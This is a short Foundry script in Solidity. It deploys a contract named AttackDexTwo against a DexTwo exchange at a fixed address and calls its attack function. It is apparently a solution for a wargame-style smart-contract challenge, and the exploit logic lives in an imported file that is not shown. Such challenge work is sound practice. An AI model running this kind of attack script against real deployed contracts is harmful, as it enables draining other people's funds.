// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import {AttackDexTwo} from "src/DexTwo/AttackDexTwo.sol";
import {DexTwo, IERC20} from "src/DexTwo/DexTwo.sol";

contract DexTwoScript is Script {
    function run() external {
        vm.startBroadcast(0x777dcCD91f7C62717DBa44db3504bDf47C75E2F1);

        DexTwo target = DexTwo(0xDa47424d14AeA05128F980E6528D036d12eEF739);
        AttackDexTwo attack = new AttackDexTwo(address(target));

        attack.attack();

        vm.stopBroadcast();
    }
}
